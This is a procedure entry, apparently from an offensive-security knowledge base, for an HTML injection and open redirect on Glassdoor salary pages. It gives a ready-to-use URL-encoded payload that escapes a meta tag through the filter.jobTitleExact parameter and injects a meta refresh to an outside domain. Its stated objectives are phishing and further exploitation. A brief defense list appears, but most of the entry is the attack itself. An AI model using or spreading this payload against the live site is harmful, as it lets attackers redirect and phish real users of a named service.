---
tags:
  - xss
  - html-injection
  - open-redirect
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:55:38.452Z'
sub_techniques: []
id: 39ede028-8a1f-49f8-acef-e9b37f1e0a05
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-HTML-Payload-for-Open-Redirect-in-Glassdoor-Filter

## Summary

This procedure injects a URL-encoded HTML payload into the filter.jobTitleExact parameter on Glassdoor salary pages to escape the intended meta tag context and insert a redirect meta tag, enabling phishing attacks via open redirects.

## Description

The Glassdoor salary search functionality reflects user input from the filter.jobTitleExact parameter into a meta tag without proper sanitization, allowing attackers to close the tag early and inject arbitrary HTML. This procedure focuses on crafting an initial payload for redirection, which can lure users to malicious sites. It targets public-facing web pages and requires no authentication, making it suitable for drive-by attacks.

## Requirements

1. Access to a web browser like Firefox or Chrome
2. Network connectivity to https://www.glassdoor.com
3. Basic knowledge of URL encoding and HTML structure

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for reflected parameters
- Deploy WAF rules to block common HTML injection patterns
- Monitor for anomalous redirects in server logs

## Objectives

1. Break out of the meta tag to inject custom HTML
2. Force a redirect to a controlled malicious domain
3. Set up for phishing or further exploitation

## Instructions

### Step 1: Prepare the Base URL

**Context**: Start with a valid Glassdoor salary page URL to ensure the parameter is processed.

Use the following URL structure in your browser:

```url
https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115
```

> This encodes the payload to close the existing meta tag and inject a new one pointing to bit.ly for redirection.

### Step 2: Access the URL

**Context**: Load the URL to trigger the injection.

Navigate to the prepared URL in Firefox or Chrome.

> Expected: The page attempts to load but redirects immediately due to the meta refresh.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]
- [[tools/Chrome]]

## Tags

- [[xss]]
- [[html-injection]]
- [[open-redirect]]
